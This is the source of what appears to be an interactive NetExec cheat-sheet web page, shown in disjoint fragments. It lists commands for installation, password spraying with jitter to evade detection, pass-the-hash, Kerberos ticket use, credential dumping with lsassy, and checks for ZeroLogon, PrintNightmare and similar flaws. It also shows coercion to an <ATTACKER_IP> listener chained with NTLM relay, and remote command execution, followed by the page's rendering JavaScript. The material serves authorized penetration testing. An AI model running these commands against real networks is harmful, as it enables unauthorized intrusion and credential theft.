.empty{text-align:center;padding:40px;color:var(--muted)}

{id:8,n:"Force Reinstall NetExec",cat:"Installation",sub:"Unix/pipx",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Force download latest from GitHub",cmd:"pipx reinstall netexec",tips:"Use when upgrade doesn't pull latest commits."},
{id:9,n:"Kali - Update Packages",cat:"Installation",sub:"Kali Linux",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Update Kali package lists",cmd:"apt update",tips:"Always run before installing packages."},
{id:10,n:"Kali - Install NetExec",cat:"Installation",sub:"Kali Linux",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install NetExec on Kali Linux",cmd:"apt install netexec",tips:"Simplest method for Kali users. May not be latest version."},
{id:11,n:"BlackArch - Install",cat:"Installation",sub:"BlackArch",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install on BlackArch Linux",cmd:"pacman -Syu netexec",tips:"Uses pacman package manager."},
{id:12,n:"ParrotSec - Update",cat:"Installation",sub:"ParrotSec",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Update ParrotSec packages",cmd:"apt update",tips:"Run before installation."},
{id:13,n:"ParrotSec - Install",cat:"Installation",sub:"ParrotSec",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install on ParrotSec OS",cmd:"apt install netexec",tips:"Similar to Kali installation."},
{id:14,n:"Dev - Install Rust",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install Rust for development",cmd:"curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",tips:"Required for building from source."},
{id:15,n:"Dev - Install Dependencies",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install dev dependencies",cmd:"apt install pipx git && pipx ensurepath",tips:"Prepares environment for UV or Poetry."},
{id:16,n:"Dev - Install UV",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install UV package manager",cmd:"pipx install uv",tips:"Modern Python package manager, faster than pip."},
{id:17,n:"Dev - Clone Repository",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Clone NetExec source code",cmd:"git clone https://github.com/Pennyw0rth/NetExec && cd NetExec",tips:"Get the latest development version."},
{id:18,n:"Dev - Run with UV",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install and run with UV",cmd:"uv tool install . && uv run netexec",tips:"Quick way to run development version."},
{id:19,n:"Dev - Install Poetry",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install Poetry manager",cmd:"pipx install poetry",tips:"Do NOT install poetry via APT on Kali - will crash."},
{id:20,n:"Dev - Poetry Plugin",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Add versioning plugin",cmd:'poetry self add "poetry-dynamic-versioning[plugin]" && poetry dynamic-versioning enable',tips:"Required for proper version handling."},
{id:21,n:"Dev - Run with Poetry",cat:"Installation",sub:"Development",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install and run with Poetry",cmd:"poetry install && poetry run NetExec",tips:"Full development setup with Poetry."},
{id:22,n:"Windows - Install pipx",cat:"Installation",sub:"Windows",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install pipx on Windows",cmd:"pip install pipx && python -m pipx ensurepath",tips:"Requires Python, Git, Rust, and Visual C++ Build Tools installed first."},
{id:23,n:"Windows - Install NetExec",cat:"Installation",sub:"Windows",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Install NetExec on Windows",cmd:"python -m pipx install git+https://github.com/Pennyw0rth/NetExec",tips:"Restart command line after installation."},
{id:24,n:"Windows - Fix Long Paths",cat:"Installation",sub:"Windows",proto:"Setup",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Enable long path support",cmd:'REG ADD "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f',tips:"Fixes FileNotFoundError for long paths."},

// ========== GENERAL USAGE (48) ==========
{id:25,n:"Show Help",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"Display general help",cmd:"nxc --help",tips:"Shows all protocols: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs"},
{id:26,n:"Protocol Help",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"Show protocol options",cmd:"nxc <PROTOCOL> --help",tips:"Each protocol has different options and capabilities."},
{id:27,n:"List Modules",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"List available modules",cmd:"nxc <PROTOCOL> -L",tips:"Modules extend NetExec with additional attacks."},
{id:28,n:"Module Options",cat:"General",sub:"Help & Info",proto:"General",ph:"recon",noise:"low",acc:"Local",cred:"None",purp:"Show module options",cmd:"nxc <PROTOCOL> -M <MODULE> --options",tips:"View required and optional parameters."},
{id:29,n:"Target by Hostname",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Target single host",cmd:"nxc <PROTOCOL> <HOSTNAME>",tips:"Requires DNS resolution."},
{id:30,n:"Target Multiple IPs",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Target multiple hosts",cmd:"nxc <PROTOCOL> <IP1> <IP2>",tips:"Space-separated list."},
{id:31,n:"Target CIDR Subnet",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"high",acc:"Network",cred:"None",purp:"Target entire subnet",cmd:"nxc <PROTOCOL> <TARGET>/24",tips:"Scans all 254 hosts in /24."},
{id:32,n:"Target IP Range",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"high",acc:"Network",cred:"None",purp:"Target IP range",cmd:"nxc <PROTOCOL> <IP_START>-<IP_END>",tips:"Example: 192.168.1.1-192.168.1.50"},
{id:33,n:"Target from File",cat:"General",sub:"Target Formats",proto:"General",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Load targets from file",cmd:"nxc <PROTOCOL> <TARGETS_FILE>",tips:"One target per line."},
{id:34,n:"Basic Authentication",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Username and password auth",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS>",tips:"(Pwn3d!) = admin access. GREEN=success, RED=fail, MAGENTA=valid but restricted."},
{id:35,n:"Auth with Special Chars",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Password with special characters",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>'",tips:"Wrap in single quotes: -p 'P@ss!word'"},
{id:36,n:"Auth with Dash Prefix",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Credentials starting with dash",cmd:"nxc <PROTOCOL> <TARGET> -u='-<USER>' -p='-<PASS>'",tips:"Use = to avoid argument parsing errors."},
{id:37,n:"Auth from Database",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Database",purp:"Use credential from nxcdb",cmd:"nxc <PROTOCOL> <TARGET> -id <CRED_ID>",tips:"Pull creds from database by ID."},
{id:38,n:"Users from File",cat:"General",sub:"Authentication",proto:"General",ph:"enum",noise:"medium",acc:"Network",cred:"Password",purp:"Load usernames from file",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASS>",tips:"One username per line."},
{id:39,n:"Spray Multiple Users",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Spray password to users",cmd:"nxc <PROTOCOL> <TARGET> -u <USER1> <USER2> -p <PASS>",tips:"Watch for account lockouts!"},
{id:40,n:"Spray Multiple Passwords",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Try multiple passwords",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS1> <PASS2>",tips:"Tests each password against user."},
{id:41,n:"Spray from Files",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"User and password files",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"Creates all user×password combinations."},
{id:42,n:"Spray Hash Files",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Hash",purp:"Spray NTLM hashes",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -H <HASHES_FILE>",tips:"Pass-the-hash across accounts."},
{id:43,n:"No Bruteforce Mode",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"medium",acc:"Network",cred:"Password",purp:"One-to-one user:pass mapping",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASSWORDS_FILE> --no-bruteforce",tips:"user1→pass1, user2→pass2. Avoids lockouts."},
{id:44,n:"Continue on Success",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"high",acc:"Network",cred:"Password",purp:"Continue after valid creds",cmd:"nxc <PROTOCOL> <TARGET> -u <USERS_FILE> -p <PASS> --continue-on-success",tips:"Find ALL valid accounts. Incompatible with command execution."},
{id:45,n:"Jitter - Fixed Delay",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"low",acc:"Network",cred:"Password",purp:"Fixed delay between attempts",cmd:"nxc <PROTOCOL> <TARGET> --jitter 3 -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"3 second delay. Helps avoid detection."},
{id:46,n:"Jitter - Random Delay",cat:"General",sub:"Brute Force",proto:"General",ph:"cred",noise:"low",acc:"Network",cred:"Password",purp:"Random delay between attempts",cmd:"nxc <PROTOCOL> <TARGET> --jitter 2-5 -u <USERS_FILE> -p <PASSWORDS_FILE>",tips:"Random 2-5 second delay. More stealthy."},
{id:47,n:"Kerberos with Password",cat:"General",sub:"Kerberos",proto:"SMB",ph:"enum",noise:"medium",acc:"Domain",cred:"Password",purp:"Kerberos authentication",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -k",tips:"Auto handles TGT/ST. Requires DNS resolution."},
{id:48,n:"Set Ticket Cache",cat:"General",sub:"Kerberos",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"Ticket",purp:"Set KRB5CCNAME variable",cmd:"export KRB5CCNAME=<CCACHE_FILE>",tips:"Point to .ccache ticket file."},
{id:49,n:"Use Cached Ticket",cat:"General",sub:"Kerberos",proto:"SMB",ph:"enum",noise:"medium",acc:"Domain",cred:"Ticket",purp:"Auth with cached ticket",cmd:"nxc smb <TARGET> --use-kcache",tips:"Uses ticket from KRB5CCNAME."},
{id:50,n:"Execute with Ticket",cat:"General",sub:"Kerberos",proto:"SMB",ph:"exploit",noise:"high",acc:"Domain",cred:"Ticket",purp:"Command exec with ticket",cmd:"nxc smb <TARGET> --use-kcache -x whoami",tips:"Combines ticket auth with exec."},
{id:51,n:"LDAP Kerberos KDC",cat:"General",sub:"Kerberos",proto:"LDAP",ph:"enum",noise:"medium",acc:"Domain",cred:"Ticket",purp:"LDAP with KDC host",cmd:"nxc ldap <TARGET> -k --kdcHost <KDC_HOST>",tips:"Use when domain resolution fails."},
{id:52,n:"PFX Certificate Auth",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"Auth with PFX certificate",cmd:"nxc smb <TARGET> --pfx-cert <PFX_FILE> -u <USER>",tips:"Generates ccache file for Kerberos."},
{id:53,n:"PFX with Password",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"Password-protected PFX",cmd:"nxc smb <TARGET> --pfx-cert <PFX_FILE> --pfx-pass <PFX_PASS> -u <USER>",tips:"When PFX is password protected."},
{id:54,n:"Base64 PFX Auth",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"Base64 encoded PFX",cmd:"nxc smb <TARGET> --pfx-base64 <PFX_B64> -u <USER>",tips:"Useful for passing cert as string."},
{id:55,n:"PEM Certificate Auth",cat:"General",sub:"Certificates",proto:"SMB",ph:"enum",noise:"medium",acc:"Network",cred:"Certificate",purp:"PEM cert and key files",cmd:"nxc smb <TARGET> --pem-cert <PEM_CERT> --pem-key <PEM_KEY> -u <USER>",tips:"Separate certificate and key."},
{id:56,n:"Run Module",cat:"General",sub:"Modules",proto:"General",ph:"post",noise:"medium",acc:"Network",cred:"Password",purp:"Execute a module",cmd:"nxc <PROTOCOL> <TARGET> -M <MODULE>",tips:"Modules extend functionality."},
{id:57,n:"Module with Credentials",cat:"General",sub:"Modules",proto:"SMB",ph:"post",noise:"high",acc:"Admin",cred:"Password",purp:"Run module with auth",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M lsassy",tips:"Most modules require admin."},
{id:58,n:"Module with Options",cat:"General",sub:"Modules",proto:"General",ph:"post",noise:"medium",acc:"Network",cred:"Password",purp:"Pass module options",cmd:"nxc <PROTOCOL> <TARGET> -M <MODULE> -o <OPTION>=<VALUE>",tips:"MSFvenom-style KEY=value."},
{id:59,n:"Multiple Modules",cat:"General",sub:"Modules",proto:"General",ph:"post",noise:"high",acc:"Network",cred:"Password",purp:"Run multiple modules",cmd:"nxc <PROTOCOL> <TARGET> -M <MODULE1> -M <MODULE2>",tips:"Each module with -M flag."},
{id:60,n:"Custom DNS Server",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"Use custom DNS",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> --dns-server <DNS_IP>",tips:"Override system DNS."},
{id:61,n:"DNS Timeout",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"Set DNS timeout",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> --dns-timeout <SECONDS>",tips:"Increase for slow networks."},
{id:62,n:"DNS over TCP",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"Force TCP for DNS",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> --dns-tcp",tips:"More reliable than UDP."},
{id:63,n:"Force IPv6",cat:"General",sub:"DNS Options",proto:"General",ph:"enum",noise:"low",acc:"Network",cred:"Password",purp:"IPv6 connections",cmd:"nxc <PROTOCOL> <TARGET> -u <USER> -p <PASS> -6",tips:"For IPv6 environments."},
{id:64,n:"Database Shell",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Open nxcdb shell",cmd:"nxcdb",tips:"Manage workspaces, creds, export."},
{id:65,n:"Create Workspace",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Create new workspace",cmd:"workspace create <NAME>",tips:"Separate different engagements."},
{id:66,n:"Switch Workspace",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Switch workspace",cmd:"workspace <NAME>",tips:"All actions stored in current."},
{id:67,n:"List Workspaces",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Show all workspaces",cmd:"workspace list",tips:"Arrow shows current."},
{id:68,n:"Export to CSV",cat:"General",sub:"Database",proto:"General",ph:"setup",noise:"low",acc:"Local",cred:"None",purp:"Export database data",cmd:"export shares detailed <OUTPUT_FILE>",tips:"Export creds, hosts, shares."},
{id:69,n:"Log to File",cat:"General",sub:"Logging",proto:"General",ph:"post",noise:"low",acc:"Network",cred:"None",purp:"Save output to file",cmd:"nxc <PROTOCOL> <TARGET> --log <FILENAME>",tips:"Logs current command output."},
{id:70,n:"Generate Hosts File",cat:"General",sub:"Logging",proto:"General",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Create /etc/hosts entries",cmd:"nxc <PROTOCOL> <TARGET> --generate-hosts-file",tips:"Useful in labs without DNS."},
{id:71,n:"Generate krb5.conf",cat:"General",sub:"Logging",proto:"SMB",ph:"setup",noise:"low",acc:"Network",cred:"Password",purp:"Generate Kerberos config",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --generate-krb5-file <PATH>",tips:"Then: export KRB5_CONFIG=path"},
{id:72,n:"Generate TGT",cat:"General",sub:"Logging",proto:"SMB",ph:"cred",noise:"medium",acc:"Domain",cred:"Password",purp:"Generate and save TGT",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> --generate-tgt <PATH>",tips:"Then: export KRB5CCNAME=path"},

// ========== VULNERABILITIES (14) ==========
{id:73,n:"Check ZeroLogon",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"CVE-2020-1472 ZeroLogon",cmd:"nxc smb <TARGET> -u '' -p '' -M zerologon",tips:"Critical DC vulnerability. No auth required."},
{id:74,n:"Check noPAC",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"Password",purp:"CVE-2021-42278 noPAC",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M nopac",tips:"Requires valid credentials."},
{id:75,n:"Check PrintNightmare",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"CVE-2021-34527 PrintNightmare",cmd:"nxc smb <TARGET> -u '' -p '' -M printnightmare",tips:"Print Spooler RCE."},
{id:76,n:"Check SMBGhost",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"CVE-2020-0796 SMBGhost",cmd:"nxc smb <TARGET> -u '' -p '' -M smbghost",tips:"SMBv3 compression vulnerability."},
{id:77,n:"Check MS17-010",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"EternalBlue MS17-010",cmd:"nxc smb <TARGET> -u '' -p '' -M ms17-010",tips:"Not tested outside LAB."},
{id:78,n:"Check NTLM Reflection",cat:"Vulnerabilities",sub:"CVE Checks",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"Password",purp:"CVE-2025-33073",cmd:"nxc smb <TARGET> -u <USER> -p <PASS> -M ntlm_reflection",tips:"Requires credentials."},
{id:79,n:"Coerce Plus Scan",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"Check all coerce vulns",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus",tips:"PetitPotam, DFSCoerce, PrinterBug, etc."},
{id:80,n:"Coerce with Listener",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"exploit",noise:"medium",acc:"Network",cred:"None",purp:"Coerce to attacker IP",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o LISTENER=<ATTACKER_IP>",tips:"Chain with NTLM relay."},
{id:81,n:"Coerce All Methods",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"exploit",noise:"high",acc:"Network",cred:"None",purp:"Run all coerce methods",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o LISTENER=<ATTACKER_IP> ALWAYS=true",tips:"Runs all methods regardless of success."},
{id:82,n:"Check PetitPotam",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"PetitPotam only",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam",tips:"Or use M=pe shortform."},
{id:83,n:"Check PrinterBug",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"PrinterBug/SpoolSample",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o M=pr",tips:"Shortform: M=pr"},
{id:84,n:"Check DFSCoerce",cat:"Vulnerabilities",sub:"Coercion",proto:"SMB",ph:"recon",noise:"low",acc:"Network",cred:"None",purp:"DFSCoerce only",cmd:"nxc smb <TARGET> -u '' -p '' -M coerce_plus -o M=dfs",tips:"Shortform: M=dfs"},

{id:89,n:"Users via Null Session",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum users without auth",cmd:"nxc smb <TARGET> -u '' -p '' --users",tips:"Domain user enumeration."},
{id:90,n:"Groups via Null Session",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum groups without auth",cmd:"nxc smb <TARGET> -u '' -p '' --groups",tips:"Domain group enumeration."},
{id:91,n:"Guest Login Check",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Check guest login",cmd:"nxc smb <TARGET> -u 'a' -p ''",tips:"Empty password, random user."},
{id:92,n:"Shares via Guest",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"enum",noise:"low",acc:"Network",cred:"None",purp:"Enum shares as guest",cmd:"nxc smb <TARGET> -u 'a' -p '' --shares",tips:"May see more than null session."},
{id:93,n:"Generate Relay List",cat:"SMB",sub:"Enumeration",proto:"SMB",ph:"recon",noise:"medium",acc:"Network",cred:"None",purp:"Hosts without SMB signing",cmd:"nxc smb <TARGET>/24 --gen-relay-list <OUTPUT_FILE>",tips:"Essential for NTLM relay attacks."},

document.addEventListener('DOMContentLoaded', () => {
    renderNavigation();
    showAllCommands();
    document.getElementById('total-cmds').textContent = commands.length;
    
    // Search with debounce
    let _nxcSearchTimer;
    const _nxcSearchEl = document.getElementById('search');
    _nxcSearchEl.addEventListener('input', () => { clearTimeout(_nxcSearchTimer); _nxcSearchTimer = setTimeout(filterCommands, 120); });
    _nxcSearchEl.addEventListener('keydown', (e) => { if (e.key === 'Escape') { _nxcSearchEl.value = ''; filterCommands(); } });

    // / to focus search
    document.addEventListener('keydown', (e) => {
        if (e.key === '/' && document.activeElement !== _nxcSearchEl && !e.ctrlKey && !e.altKey && !e.metaKey) {
            e.preventDefault(); _nxcSearchEl.focus(); _nxcSearchEl.select();
        }
    });
    
    // Apply on input change
    document.querySelectorAll('.gen-group input').forEach(input => {
        input.addEventListener('change', refreshAll);
    });
});

        const catCmds = commands.filter(c => c.cat === cat);
        
        // Get unique subs for this category
        const subs = [...new Set(catCmds.map(c => c.sub))];
        
        html += `
            <div class="nav-cat" id="nav-${cat.replace(/\s/g,'')}">
                <div class="nav-cat-header" onclick="toggleNavCat('${cat.replace(/\s/g,'')}')">
                    <div style="display:flex;align-items:center">
                        <span class="icon ${catData.color}">${catData.icon}</span>
                        <span>${cat}</span>
                    </div>
                    <div style="display:flex;align-items:center;gap:8px">
                        <span class="count">${catCmds.length}</span>
                        <span class="arrow">▼</span>
                    </div>
                </div>
                <div class="nav-cat-items">
                    <div class="nav-item" onclick="showCategory('${cat}')">
                        <span>📋 All ${cat}</span>
                        <span class="cnt">${catCmds.length}</span>
                    </div>
                    ${subs.map(sub => {
                        const subCnt = catCmds.filter(c => c.sub === sub).length;
                        return `<div class="nav-item" onclick="showSubCategory('${cat}','${sub}')">
                            <span>${sub}</span>
                            <span class="cnt">${subCnt}</span>
                        </div>`;
                    }).join('')}
                </div>
            </div>
        `;
    });
    
    nav.innerHTML = html;
}

function toggleNavCat(catId) {
    document.getElementById('nav-' + catId).classList.toggle('open');
}

// ============================================
// CONTENT RENDERING
// ============================================
function showAllCommands() {
    currentCategory = null;
    currentSub = null;
    updateNavActive();
    
    const content = document.getElementById('content');
    let html = `
        <div class="section-header">
            <h2>🎯 All Commands</h2>
            <p>Complete NetExec command reference with ${commands.length} commands across ${Object.keys(categories).length} categories</p>
        </div>
        <div class="guide-box">
            <h4>💡 Quick Start</h4>
            <p>Fill in the <strong>global inputs</strong> at the top with your target info. Click <strong>Apply All</strong> to substitute values in all commands. Click any command to expand and copy.</p>
            <div class="tip">💡 Start with vulnerability scans: ZeroLogon, PrintNightmare, SMBGhost, noPAC, and coercion checks!</div>
        </div>
    `;
    
    // Group by category
    Object.keys(categories).forEach(cat => {
        const catCmds = commands.filter(c => c.cat === cat);
        if(catCmds.length === 0) return;
        
        html += renderCategorySection(cat, catCmds, true);
    });
    
    content.innerHTML = html;
    updateShowingCount();
}

function showCategory(cat) {
    currentCategory = cat;
    currentSub = null;
    updateNavActive();
    
    const catData = categories[cat];
    const catCmds = commands.filter(c => c.cat === cat);
    
    const content = document.getElementById('content');
    let html = `
        <div class="section-header">
            <h2>${catData.icon} ${cat} <span class="proto-badge" style="background:var(--purple)">${catCmds.length} Commands</span></h2>
            <p>${catData.guide.desc}</p>
        </div>
        <div class="guide-box">
            <h4>📖 ${catData.guide.title}</h4>
            <p>${catData.guide.desc}</p>
            ${catData.guide.tips ? `<ul>${catData.guide.tips.map(t => `<li>${t}</li>`).join('')}</ul>` : ''}
            ${catData.guide.warn ? `<div class="warn">⚠️ ${catData.guide.warn}</div>` : ''}
        </div>
    `;
    
    // Group by sub
    const subs = [...new Set(catCmds.map(c => c.sub))];
    subs.forEach(sub => {
        const subCmds = catCmds.filter(c => c.sub === sub);
        html += `
            <div class="subcategory">
                <div class="subcategory-header">${sub} (${subCmds.length})</div>
                ${subCmds.map(c => renderCommandCard(c)).join('')}
            </div>
        `;
    });
    
    content.innerHTML = html;
    updateShowingCount(catCmds.length);
}

function showSubCategory(cat, sub) {
    currentCategory = cat;
    currentSub = sub;
    updateNavActive();
    
    const catData = categories[cat];
    const subCmds = commands.filter(c => c.cat === cat && c.sub === sub);
    
    const content = document.getElementById('content');
    let html = `
        <div class="section-header">
            <h2>${catData.icon} ${cat} → ${sub} <span class="proto-badge" style="background:var(--cyan)">${subCmds.length} Commands</span></h2>
            <p>${catData.guide.desc}</p>
        </div>
        ${subCmds.map(c => renderCommandCard(c)).join('')}
    `;
    
    content.innerHTML = html;
    updateShowingCount(subCmds.length);
}

function renderCategorySection(cat, catCmds, collapsed = false) {
    const catData = categories[cat];
    return `
        <div class="category-section ${collapsed ? '' : 'collapsed'}" id="cat-${cat.replace(/\s/g,'')}">
            <div class="category-header" onclick="toggleCategory('${cat.replace(/\s/g,'')}')">
                <div class="category-icon ${catData.color}">${catData.icon}</div>
                <div class="category-info">
                    <h3>${cat}</h3>
                    <p>${catData.guide.desc.substring(0, 80)}...</p>
                </div>
                <span class="category-count">${catCmds.length}</span>
                <span class="category-arrow">▼</span>
            </div>
            <div class="category-content">
                ${catCmds.slice(0, 10).map(c => renderCommandCard(c)).join('')}
                ${catCmds.length > 10 ? `<div style="text-align:center;padding:10px"><button class="gen-btn" onclick="showCategory('${cat}')">View all ${catCmds.length} commands →</button></div>` : ''}
            </div>
        </div>
    `;
}

function toggleCategory(catId) {
    document.getElementById('cat-' + catId).classList.toggle('collapsed');
}

// ============================================
// COMMAND CARD
// ============================================
function renderCommandCard(c) {
    const isExpanded = expandedCards.has(c.id);
    return `
        <div class="cmd-card ${isExpanded ? 'expanded' : ''}" id="cmd-${c.id}">
            <div class="cmd-header" onclick="toggleCmd(${c.id})">
                <span class="cmd-num">#${c.id}</span>
                <div class="cmd-main">
                    <div class="cmd-title">${hlText(c.n)}</div>
                    <div class="cmd-purpose">${hlText(c.purp)}</div>
                </div>
                <div class="cmd-badges">
                    <span class="badge proto">${c.proto}</span>
                    <span class="badge phase ${c.ph}">${phaseLabels[c.ph]}</span>
                    <span class="badge noise ${c.noise}">${c.noise}</span>
                </div>
                <span class="cmd-expand">${isExpanded ? '▲' : '▼'}</span>
            </div>
            <div class="cmd-details">
                <div class="cmd-details-inner">
                    <div class="cmd-meta">
                        <div class="cmd-meta-item"><span class="cmd-meta-label">Protocol</span><span class="cmd-meta-value">${c.proto}</span></div>
                        <div class="cmd-meta-item"><span class="cmd-meta-label">Phase</span><span class="cmd-meta-value">${phaseLabels[c.ph]}</span></div>
                        <div class="cmd-meta-item"><span class="cmd-meta-label">Noise</span><span class="cmd-meta-value">${c.noise}</span></div>
                        <div class="cmd-meta-item"><span class="cmd-meta-label">Access</span><span class="cmd-meta-value">${c.acc}</span></div>
                        <div class="cmd-meta-item"><span class="cmd-meta-label">Creds</span><span class="cmd-meta-value">${c.cred}</span></div>
                    </div>
                    <div class="cmd-box">
                        <code id="cmd-code-${c.id}">${processCommand(c.cmd)}</code>
                        <button class="copy-btn" onclick="copyCmd(${c.id}, event)">Copy</button>
                    </div>
                    ${c.tips ? `<div class="cmd-tips"><div class="cmd-tips-title">💡 Tips</div><div class="cmd-tips-content">${hlText(c.tips)}</div></div>` : ''}
                </div>
            </div>
        </div>
    `;
}

function toggleCmd(id) {
    if(expandedCards.has(id)) {
        expandedCards.delete(id);
    } else {
        expandedCards.add(id);
    }
    document.getElementById('cmd-' + id).classList.toggle('expanded');
}

// ============================================
// COMMAND PROCESSING
// ============================================
function processCommand(cmd) {
    let result = escapeHtml(cmd);
    
    Object.keys(globalVars).forEach(ph => {
        const val = getGlobalValue(ph);
        const escapedPh = ph.replace(/[<>]/g, m => m === '<' ? '&lt;' : '&gt;');
        const regex = new RegExp(escapedPh, 'g');
        
        if(val) {
            result = result.replace(regex, `<span class="filled">${escapeHtml(val)}</span>`);
        } else {
            result = result.replace(regex, `<span class="ph">${escapedPh}</span>`);
